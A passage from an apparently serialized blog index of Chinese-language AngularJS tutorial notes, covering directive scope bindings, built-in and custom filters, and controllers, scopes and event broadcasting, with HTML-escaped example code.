expiry: 10 &#125;, &#123; name: \"Bananas\", category: \"Fruit\", price: 2.42, expiry: 7 &#125;, &#123; name: \"Pears\", category: \"Fruit\", price: 2.02, expiry: 6 &#125; ]; &#125;)&lt;/script&gt; templateUrl可以指定使用外部模版时的url地址，这个地址可以是字符串，也可以是由表达式或函数返回的字符串。1234templateUrl: function (elem, attrs) &#123; return attrs[\"template\"] == \"table\" ? \"tableTemplate.html\" : \"itemTemplate.html\";&#125; 通过scope控制指令作用域有的时候，需要对指令的作用域做限制，虽然可以通过创建新建控制器来指定指令的作用域，但有更简单方法是使用scope属性，当scope值为true时，表示每个指令实例将创建自己的作用域，同时会继承父作用域。 12345678910111213141516171819202122232425262728293031323334353637&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Directive Scopes&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script type=\"text/ng-template\" id=\"scopeTemplate\"&gt; &lt;div class=\"panel-body\"&gt; &lt;p&gt;Name: &lt;input ng-model=\"data.name\" /&gt;&lt;/p&gt; &lt;p&gt;City: &lt;input ng-model=\"city\" /&gt;&lt;/p&gt; &lt;p&gt;Country: &lt;input ng-model=\"country\" /&gt;&lt;/p&gt; &lt;/div&gt; &lt;/script&gt; &lt;script type=\"text/javascript\"&gt; angular.module(\"exampleApp\", []) .directive(\"scopeDemo\", function () &#123; return &#123; template: function() &#123; return angular.element( document.querySelector(\"#scopeTemplate\")).html(); &#125;, scope: true &#125; &#125;) .controller(\"scopeCtrl\", function ($scope) &#123; $scope.data = &#123; name: \"Adam\" &#125;; $scope.city = \"London\"; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"scopeCtrl\"&gt; &lt;div class=\"panel panel-default\"&gt; &lt;div class=\"panel-body\" scope-demo&gt;&lt;/div&gt; &lt;div class=\"panel-body\" scope-demo&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 本例中，data.name属性会在指令的各个实例之间贡献，而绑定到该属性的输入框将同步更新。city属性将在控制器的作用域上被直接赋值，而所有指令的作用域会使用同一值初始化，但若指令中的输入框元素被修改后，则会在指令自己的作用域上创建同名变量覆盖，以后更改的也是自己的同名变量。country这个属性没有被赋值初始化，所以当相应输入框被修改时，指令的每个实例将会创建独立的country属性。 See the Pen 自定义隔离作用域指令 by XmoyKing (@xmoyking) on CodePen. 有时，这种默认继承覆盖父作用域同名变量的行为会给程序带来一些不受控制的感觉，这时候就需要一个彻底隔绝的全新作用域，当scope设置为一个对象时，比如空对象{}，就可以创建这样一个隔离的作用域。 当设置scope为{}时，所有留个输入框都将是空白，因为默认没有从父作用域继承任何数据，只有编辑时才会在自己的指令作用域中隐式创建数据。 但有的时候，又不能完全隔绝作用域，因为会使得指令输入和输出数据变得麻烦，这时，需要用到ng提供的指定作用域选项来控制父子作用域间的关系。 设置指令作用域内的一个属性为单向映射：123456789101112131415161718192021222324252627282930313233343536373839&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Directive Scopes&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script type=\"text/ng-template\" id=\"scopeTemplate\"&gt; &lt;div class=\"panel-body\"&gt; &lt;p&gt;Data Value: &#123;&#123;local&#125;&#125;&lt;/p&gt; &lt;/div&gt; &lt;/script&gt; &lt;script type=\"text/javascript\"&gt; angular.module(\"exampleApp\", []) .directive(\"scopeDemo\", function () &#123; return &#123; template: function() &#123; return angular.element( document.querySelector(\"#scopeTemplate\")).html(); &#125;, scope: &#123; local: \"@nameprop\" &#125; &#125; &#125;) .controller(\"scopeCtrl\", function ($scope) &#123; $scope.data = &#123; name: \"Adam\" &#125;; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"scopeCtrl\"&gt; &lt;div class=\"panel panel-default\"&gt; &lt;div class=\"panel-body\"&gt; Direct Binding: &lt;input ng-model=\"data.name\" /&gt; &lt;/div&gt; &lt;div class=\"panel-body\" scope-demo nameprop=\"&#123;&#123;data.name&#125;&#125;\"&gt;&lt;/div&gt; &lt;div class=\"panel-body\" scope-demo nameprop=\"&#123;&#123;data.name + 'Freeman'&#125;&#125;\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; local属性告诉ng需要在指令作用域上根据nameprop定义一个新的属性，local属性以@为前缀，指定local值应该从一个来自nameprop的html标签属性的单向绑定来获取，即通过nameprop中的表达式指定指令作用域中local的值。这里存在了两层数据绑定，第一层是控制器作用域中的data.name属性绑定至隔离指令作用域中的local属性，这个绑定是由html元素属性值确定的,上例中两个nameprop中的表达式不一样。第二层是将隔离指令作用域中的local属性绑定值指令模版中的内联的单向绑定表达式。 See the Pen 自定义指令隔离作用域双向绑定 by XmoyKing (@xmoyking) on CodePen. 当需要使用双向绑定时，需要将@更换为=，同时在模版中使用ng-model指定双向绑定,即：1234567scope: &#123; local: \"@nameprop\"&#125;nameprop=\"data.name\"&lt;p&gt;Data Value: &lt;input ng-model=\"local\" /&gt;&lt;/p&gt; 最后一种是将一个需要计算的表达式作为属性，并在其作用域中进行计算,直接看例子：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Directive Scopes&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script type=\"text/ng-template\" id=\"scopeTemplate\"&gt; &lt;div class=\"panel-body\"&gt; &lt;p&gt;Name: &#123;&#123;local&#125;&#125;, City: &#123;&#123;cityFn()&#125;&#125;&lt;/p&gt; &lt;/div&gt; &lt;/script&gt; &lt;script type=\"text/javascript\"&gt; angular.module(\"exampleApp\", []) .directive(\"scopeDemo\", function () &#123; return &#123; template: function () &#123; return angular.element( document.querySelector(\"#scopeTemplate\")).html(); &#125;, scope: &#123; local: \"=nameprop\", cityFn: \"&amp;city\" &#125; &#125; &#125;) .controller(\"scopeCtrl\", function ($scope) &#123; $scope.data = &#123; name: \"Adam\", defaultCity: \"London\" &#125;; $scope.getCity = function (name) &#123; return name == \"Adam\" ? $scope.data.defaultCity : \"Unknown\"; &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"scopeCtrl\"&gt; &lt;div class=\"panel panel-default\"&gt; &lt;div class=\"panel-body\"&gt; Direct Binding: &lt;input ng-model=\"data.name\" /&gt; &lt;/div&gt; &lt;div class=\"panel-body\" scope-demo city=\"getCity(data.name)\" nameprop=\"data.name\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 使用&amp;指定作为前缀，指定提供表达式计算的函数，在指令模版被渲染时才进行计算。 cityFn: &quot;&amp;city&quot;中的city表示指令中html属性名，其属性值将会绑定到cityFn函数名上，当指令模版中的该函数被调用时就需要计算表达式了，由getCity(data.name)这个表达式计算得出，即当name为Adam时，返回London。 See the Pen 自定义指令，隔离作用域计算表达式 by XmoyKing (@xmoyking) on CodePen. 但我们需要的数据不是来自外部的父作用域时（data.name）,而是指令作用域内部时，我们可以这样做：123&lt;div class=\"panel-body\" scope-demo city=\"getCity(nameVal)\" nameprop=\"data.name\"&gt;&lt;/div&gt;&lt;p&gt;Name: &#123;&#123;local&#125;&#125;, City: &#123;&#123;cityFn(&#123;nameVal: local&#125;)&#125;&#125;&lt;/p&gt; 指定getCity接收一个名为nameVal的变量，然后在指令模版中显示传入{nameVal: local}对象，将nameVal传入，由此可见，真正的调用顺序，由指令模版-》指令作用域-》控制器作用域。 上述关于scope的用法，尤其是三种前缀，需要多多练习直至熟悉掌握。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-16-过滤器","slug":"angularjs16","date":"2017-05-25T11:03:45.000Z","updated":"2017-12-06T14:50:08.868Z","comments":true,"path":"2017/05/25/angularjs16/","link":"","permalink":"https://github.com/xmoyKING/2017/05/25/angularjs16/","excerpt":"","text":"过滤器在指令将数据处理并显示到视图之前，对数据进行转换而不必修改作用域中原有的数据，这样能够允许同一份数据在应用中的不同部分以不同形式展示。过滤器可以执行任何类型的转换，多少情况下用于格式化或对数据进行排序。 一些内置过滤器以及相关知识点： currency 格式化为货币 number 格式化通用数字 date 格式化为日期 uppercase/lowercase 大小写 json 将js对象转化为json格式 通过script向html添加本地文件 limitTo 规定数量的数组中的元素 orderBy 对数组进行排序 Module.filter 指定工厂函数，生成一个执行过滤器函数 使用$filter 服务，访问和调用其它过滤器 为什么不在控制器中过滤数据？有的时候，将数据转换或格式化的逻辑放在控制器中时很方便而且快捷的事儿，为什么需要将过滤器放在视图中使用呢？ 主要是因为，在控制器中转换数据然后直接输出限制了数据的使用方式，因为只有转化后的而没有原始数据，就无法将这个数据用在其他方法或视图中了。 使用过滤器的好处在于，能保留作用域中数据的完整性，将格式化逻辑放在控制器之外意味着能在整个应用中使用，且易于测试和维护。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Filters&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.products = [ &#123; name: \"Apples\", category: \"Fruit\", price: 1.20, expiry: 10 &#125;, &#123; name: \"Bananas\", category: \"Fruit\", price: 2.42, expiry: 7 &#125;, &#123; name: \"Pears\", category: \"Fruit\", price: 2.02, expiry: 6 &#125;, // ...other data objects omitted for brevity... ]; $scope.getExpiryDate = function (days) &#123; var now = new Date(); return now.setDate(now.getDate() + days); &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"panel panel-default\"&gt; &lt;div class=\"panel-heading\"&gt; &lt;h3&gt; Products &lt;span class=\"label label-primary\"&gt;&#123;&#123;products.length&#125;&#125;&lt;/span&gt; &lt;/h3&gt; &lt;/div&gt; &lt;div class=\"panel-body\"&gt; &lt;table class=\"table table-striped table-bordered table-condensed\"&gt; &lt;thead&gt; &lt;tr&gt; &lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Category&lt;/td&gt; &lt;td&gt;Expiry&lt;/td&gt;&lt;td class=\"text-right\"&gt;Price&lt;/td&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr ng-repeat=\"p in products\"&gt; &lt;td&gt;&#123;&#123;p.name | uppercase &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;p.category | lowercase &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;getExpiryDate(p.expiry) | date:\"dd MMM yy\"&#125;&#125;&lt;/td&gt; &lt;td class=\"text-right\"&gt;$&#123;&#123;p.price | number:0 &#125;&#125;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 其中，date过滤器支持一些快捷格式字符串： medium 相当于MMM d, y h:mm:ss a short M/d/yy h:mm a… 过滤集合ng包含三个内置的集合过滤器，同时也支持自定义过滤器。 limitTo可以限制数组中取出的项目的数量filter过滤器用于从数据中选择一些对象，条件为指定的表达式，或者一个函数orderBy可对数组中的对象进行排序，指定一个表达式或函数，最简单的是指定为属性名，若在属性名前加负号，表示排序方向 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Filters&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.products = [ &#123; name: \"Apples\", category: \"Fruit\", price: 1.20, expiry: 10 &#125;, &#123; name: \"Bananas\", category: \"Fruit\", price: 2.42, expiry: 7 &#125;, &#123; name: \"Pears\", category: \"Fruit\", price: 2.02, expiry: 6 &#125;, &#123; name: \"Tuna\", category: \"Fish\", price: 20.45, expiry: 3 &#125;, &#123; name: \"Salmon\", category: \"Fish\", price: 17.93, expiry: 2 &#125;, &#123; name: \"Trout\", category: \"Fish\", price: 12.93, expiry: 4 &#125;, &#123; name: \"Beer\", category: \"Drinks\", price: 2.99, expiry: 365 &#125;, &#123; name: \"Wine\", category: \"Drinks\", price: 8.99, expiry: 365 &#125;, &#123; name: \"Whiskey\", category: \"Drinks\", price: 45.99, expiry: 365 &#125; ]; $scope.limitVal = \"5\"; $scope.limitRange = []; for (var i = (0 - $scope.products.length); i &lt;= $scope.products.length; i++) &#123; $scope.limitRange.push(i.toString()); &#125; $scope.selectItems = function (item) &#123; return item.category == \"Fish\" || item.name == \"Beer\"; &#125;; $scope.myCustomSorter = function (item) &#123; return item.expiry &lt; 5 ? 0 : item.price; &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"panel panel-default\"&gt; &lt;div class=\"panel-heading\"&gt; &lt;h3&gt; Products &lt;span class=\"label label-primary\"&gt;&#123;&#123;products.length&#125;&#125;&lt;/span&gt; &lt;/h3&gt; &lt;/div&gt; &lt;div class=\"panel-body\"&gt; Limit: &lt;select ng-model=\"limitVal\" ng-options=\"item for item in limitRange\"&gt;&lt;/select&gt; &lt;/div&gt; &lt;div class=\"panel-body\"&gt;&lt;!--limitTo使用 --&gt; &lt;table class=\"table table-striped table-bordered table-condensed\"&gt; &lt;thead&gt; &lt;tr&gt; &lt;td&gt;Name&lt;/td&gt; &lt;td&gt;Category&lt;/td&gt; &lt;td&gt;Expiry&lt;/td&gt; &lt;td class=\"text-right\"&gt;Price&lt;/td&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr ng-repeat=\"p in products | limitTo:limitVal\"&gt; &lt;td&gt;&#123;&#123;p.name&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;p.category&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;p.expiry&#125;&#125;&lt;/td&gt; &lt;td class=\"text-right\"&gt;&#123;&#123;p.price | currency &#125;&#125;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt;&lt;!--filter使用 --&gt; &lt;table class=\"table table-striped table-bordered table-condensed\"&gt; &lt;thead&gt; &lt;tr&gt; &lt;td&gt;Name&lt;/td&gt; &lt;td&gt;Category&lt;/td&gt; &lt;td&gt;Expiry&lt;/td&gt; &lt;td class=\"text-right\"&gt;Price&lt;/td&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr ng-repeat=\"p in products | filter:selectItems\"&gt; &lt;td&gt;&#123;&#123;p.name&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;p.category&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;p.expiry&#125;&#125;&lt;/td&gt; &lt;td class=\"text-right\"&gt;&#123;&#123;p.price | currency &#125;&#125;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt;&lt;!--orderBy使用 --&gt; &lt;table class=\"table table-striped table-bordered table-condensed\"&gt; &lt;thead&gt; &lt;tr&gt; &lt;td&gt;Name&lt;/td&gt; &lt;td&gt;Category&lt;/td&gt; &lt;td&gt;Expiry&lt;/td&gt; &lt;td class=\"text-right\"&gt;Price&lt;/td&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr ng-repeat=\"p in products | orderBy:'-price'\"&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 可以对orderBy使用一个数组，数组元素为属性名或函数名，用于依次进行排序。1orderBy: [myCustomSorter, '-price'] 过滤器也可以串联起来,一般是用于集合，对单个数据使用串联过滤器没什么必要：1ng-repeat=\"p in products | orderBy:[myCustomSorter, '-price'] | limitTo: 5\" 自定义过滤器通过Module.filter能够自定义过滤器，创建一个按照自定义规则格式化数据的过滤器。 比如:labelCase格式化一个字符串为首字母大写其他小写/首字母小写其他大写,skip跳过一定数量的项，然后正常返回后面的值take将limitTo和skip结合起来12345678910111213141516171819202122232425262728293031angular.module(\"exampleApp\") .filter(\"labelCase\", function () &#123; return function (value, reverse) &#123; if (angular.isString(value)) &#123; var intermediate = reverse ? value.toUpperCase() : value.toLowerCase(); return (reverse ? intermediate[0].toLowerCase() : intermediate[0].toUpperCase()) + intermediate.substr(1); &#125; else &#123; return value; &#125; &#125; &#125;) .filter(\"skip\", function () &#123; return function (data, count) &#123; if (angular.isArray(data) &amp;&amp; angular.isNumber(count)) &#123; if (count &gt; data.length || count &lt; 1) &#123; return data; &#125; else &#123; return data.slice(count); &#125; &#125; else &#123; return data; &#125; &#125; &#125;) .filter(\"take\", function ($filter) &#123; return function (data, skipCount, takeCount) &#123; var skippedData = $filter(\"skip\")(data, skipCount); return $filter(\"limitTo\")(skippedData, takeCount); &#125; &#125;); 使用：1234567891011&lt;tr ng-repeat=\"p in products | orderBy:[myCustomSorter, '-price'] | limitTo: 5\"&gt; &lt;td&gt;&#123;&#123;p.name | labelCase &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;p.category | labelCase:true &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;p.expiry&#125;&#125;&lt;/td&gt; &lt;td class=\"text-right\"&gt;&#123;&#123;p.price | currency &#125;&#125;&lt;/td&gt;&lt;/tr&gt;ng-repeat=\"p in products | skip:2 | limitTo: 5\"ng-repeat=\"p in products | take:2:5\"","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-15-控制器和作用域","slug":"angularjs15","date":"2017-05-24T14:27:04.000Z","updated":"2017-12-06T14:50:08.868Z","comments":true,"path":"2017/05/24/angularjs15/","link":"","permalink":"https://github.com/xmoyKING/2017/05/24/angularjs15/","excerpt":"","text":"了解作用域和控制器之间的关系，作用域作为一个沟通各控制器的桥梁，甚至可以与其他js框架集成。 主要涉及到如下内容： 创建控制器：使用Module.controller方法来定义控制器，并使用ng-controller指令将其绑定在html元素上 向控制器作用域添加数据和行为：在$scope服务上声明依赖，并在控制器的工厂方法中向其赋予相应的属性 创建单块控制器：将ng-controller指令应用于body元素，并使用工厂方法来定义应用程序所需要的数据和行为 重用控制器：将ng-controller指令应用在多个html元素上 在控制器之间进行通信：通过root scrope或者服务发送事件 从另一个控制器继承行为和数据：内嵌ng-controller指令 创建不带作用域的控制器 通知作用域某处发生变化：使用$apply、$watch和$watchCollection方法将变化注入给一个作用域或者监控一个作用域是否发生变化 Why &amp; When 作用域、控制器控制器是模型与视图之间的纽带，给视图提供数据和服务，并定义所需的业务逻辑，从而将用户行为转换成模型上的变化。 Why没有控制器就无法构建ng程序，控制器通过作用域向视图提供数据和逻辑，从模型中暴露数据给视图，基于用户与视图的交互士模型产生变化所需的逻辑。 When 控制器遍布整个应用 基本原理controller方法创建控制器，参数是新建控制器的名字和一个将被用于创建控制器的函数，这个函数应该被理解为构造器，但也可认为是工厂函数，创建ng组件所需的许多方法调用通常被表示为使用一个函数（工厂函数）创建另外一个函数（工人函数）。 有的时候，可以再控制器中顶一个一个函数表达式，然后再绑定的html中调用并传入一个参数，这种用法很奇怪，为什么不直接简化该函数：123456789101112131415161718192021222324252627282930&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Controllers&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"simpleCtrl\", function ($scope) &#123; $scope.city = \"London\"; $scope.getCountry = function (city) &#123; switch (city) &#123; case \"London\": return \"UK\"; case \"New York\": return \"USA\"; &#125; &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"well\" ng-controller=\"simpleCtrl\"&gt; &lt;p&gt;The city is: &#123;&#123;city&#125;&#125;&lt;/p&gt; &lt;p&gt;The country is: &#123;&#123;getCountry(city) || \"Unknown\"&#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 原因是： 意味着行为能够被任何city值所用，而不仅仅是被同一个作用域里定义的city值所用，再涉及到控制器继承时非常有用。 因为接收参数能够使单元测试变得更简便一些，因为这种行为是自包含的，对控制器行为使用参数并不是必须的，而且即使不使用参数时也没有什么不好。 关于作用域，最重要的一点就是改动被传播出去，自动更新所有被依赖的数据值，即使这种数据更新是通过交互产生的。比如ng-model双向绑定的值。 组织控制器使用一个单块的控制器，能够支持body元素的所有内容，对于小而简单的程序这是合理的，但当项目的复杂度增长时将会变得越来越笨拙不方便，尤其是需要包含局部视图时。 单块控制器：通过在元素上使用ng-controller指令，使用一个应用与程序所有html元素的控制器。 这种方式的优点：简单、无需担心各个作用域之间的通信问题，而且行为将被整个html所用，当使用一个单块控制器时，其实会对整个应用创建一个单独的视图。1controller -&gt; scope -&gt; view 缺点：用于简单情况，但若不断添加行为后，最终最得到一个臃肿的应用。与ng的设计哲学相违背，应该构建一个小而内聚的积木式模块，但这仅仅是风格问题，不是技术必须的。 复用控制器可以在一个应用中创建多个视图并复用同一个控制器，ng会将每一个控制器的工厂函数单独调用，结果是每个控制器实例将会拥有自己的作用域。这将分离职能，不同的视图能以不同的方法对同一份数据和功能进行展示。1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Controllers&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"simpleCtrl\", function ($scope) &#123; $scope.setAddress = function (type, zip) &#123; console.log(\"Type: \" + type + \" \" + zip); &#125; $scope.copyAddress = function () &#123; $scope.shippingZip = $scope.billingZip; &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"well\" ng-controller=\"simpleCtrl\"&gt; &lt;h4&gt;Billing Zip Code&lt;/h4&gt; &lt;div class=\"form-group\"&gt; &lt;input class=\"form-control\" ng-model=\"zip\"&gt; &lt;/div&gt; &lt;button class=\"btn btn-primary\" ng-click=\"setAddress('billingZip', zip)\"&gt; Save Billing &lt;/button&gt; &lt;/div&gt; &lt;div class=\"well\" ng-controller=\"simpleCtrl\"&gt; &lt;h4&gt;Shipping Zip Code&lt;/h4&gt; &lt;div class=\"form-group\"&gt; &lt;input class=\"form-control\" ng-model=\"zip\"&gt; &lt;/div&gt; &lt;button class=\"btn btn-primary\" ng-click=\"copyAddress()\"&gt; Use Billing &lt;/button&gt; &lt;button class=\"btn btn-primary\" ng-click=\"setAddress('shippingZip', zip)\"&gt; Save Shipping &lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 在上述的demo中，每个控制器向其作用域提供的数据和行为都与另外一个控制器相互独立，每个控制器只关心收集单独一个邮编，能简化控制器和视图。 但这种分开的控制器的副作用就是，copyAddress无法使用，因为变量被保存在了不用的作用域中。这时就必须用到ng提供的作用域之间共享数据的机制。 作用域之间的通信作用域实际上是一个层级结构，顶层是根作用域(root scope),每个控制器都被赋予一个新的作用域，整个作用域是根作用域的一个子作用域。 根作用域提供了各个作用域之间发送事件的方法，通这个方法即可以在各个控制器之间通信。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Controllers&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"simpleCtrl\", function ($scope, $rootScope) &#123; $scope.$on(\"zipCodeUpdated\", function (event, args) &#123; $scope[args.type] = args.zipCode; &#125;); $scope.setAddress = function (type, zip) &#123; $rootScope.$broadcast(\"zipCodeUpdated\", &#123; type: type, zipCode: zip &#125;); console.log(\"Type: \" + type + \" \" + zip); &#125; $scope.copyAddress = function () &#123; $scope.zip = $scope.billingZip; &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"well\" ng-controller=\"simpleCtrl\"&gt; &lt;h4&gt;Billing Zip Code&lt;/h4&gt; &lt;div class=\"form-group\"&gt; &lt;input class=\"form-control\" ng-model=\"zip\"&gt; &lt;/div&gt; &lt;button class=\"btn btn-primary\" ng-click=\"setAddress('billingZip', zip)\"&gt; Save Billing &lt;/button&gt; &lt;/div&gt; &lt;div class=\"well\" ng-controller=\"simpleCtrl\"&gt; &lt;h4&gt;Shipping Zip Code&lt;/h4&gt; &lt;div class=\"form-group\"&gt; &lt;input class=\"form-control\" ng-model=\"zip\"&gt; &lt;/div&gt; &lt;button class=\"btn btn-primary\" ng-click=\"copyAddress()\"&gt; Use Billing &lt;/button&gt; &lt;button class=\"btn btn-primary\" ng-click=\"setAddress('shippingZip', zip)\"&gt; Save Shipping &lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 根作用域可以作为一个服务被使用，所以在控制器中使用$rootScope名称声明对它的依赖，所有的作用域，包括$rootScope服务，定义了若干可用于发送和接收事件的方法。 $broadcast(name, args) 向当前作用域下的所有子作用域发送一个事件，参数是事件名称以及一个用于向事件提供额外数据的对象 $emit(name, args) 向当前作用域的父作用域发送一个事件，直至根作用域。 $on(name, handler) 注册一个事件处理函数，该函数在特定的事件被当前作用域收到时将会被调用 $broadcast和$emit事件都是具有方向性的，他们沿作用域的层级结构向上发送事件直至根作用域，或向下发送直至每一个子作用域。 在上例中，当前作用域中调用$on方法，用来对zipCodeUpdated事件创建一个处理函数，这个函数接收一个Event对象以及一个参数对象（本例中为一个type和zipCode对象） 使用服务调解作用域事件ng一般使用服务来调解作用域之间的通信，这种方法可减少重复，使用Module.service方法创建一个服务对象，该服务可被控制器用来发送和接收事件，而无需直接与作用域中的事件方法产生交互。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Controllers&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .service(\"ZipCodes\", function($rootScope) &#123; return &#123; setZipCode: function(type, zip) &#123; this[type] = zip; $rootScope.$broadcast(\"zipCodeUpdated\", &#123; type: type, zipCode: zip &#125;); &#125; &#125; &#125;) .controller(\"simpleCtrl\", function ($scope, ZipCodes) &#123; $scope.$on(\"zipCodeUpdated\", function (event, args) &#123; $scope[args.type] = args.zipCode; &#125;); $scope.setAddress = function (type, zip) &#123; ZipCodes.setZipCode(type, zip); console.log(\"Type: \" + type + \" \" + zip); &#125; $scope.copyAddress = function () &#123; $scope.zip = $scope.billingZip; &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"well\" ng-controller=\"simpleCtrl\"&gt; &lt;h4&gt;Billing Zip Code&lt;/h4&gt; &lt;div class=\"form-group\"&gt; &lt;input class=\"form-control\" ng-model=\"zip\"&gt; &lt;/div&gt; &lt;button class=\"btn btn-primary\" ng-click=\"setAddress('billingZip', zip)\"&gt; Save Billing &lt;/button&gt; &lt;/div&gt; &lt;div class=\"well\" ng-controller=\"simpleCtrl\"&gt; &lt;h4&gt;Shipping Zip Code&lt;/h4&gt; &lt;div class=\"form-group\"&gt; &lt;input class=\"form-control\" ng-model=\"zip\"&gt; &lt;/div&gt; &lt;button class=\"btn btn-primary\" ng-click=\"copyAddress()\"&gt; Use Billing &lt;/button&gt; &lt;button class=\"btn btn-primary\" ng-click=\"setAddress('shippingZip', zip)\"&gt; Save Shipping &lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 控制器能够继承，即通过ng-controller指令的嵌入位置，可以让一个父控制器中定义的功能在子控制器中使用。 See the Pen controller&amp;scope by XmoyKing (@xmoyking) on CodePen. 代码如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Controllers&lt;/title&gt; &lt;script 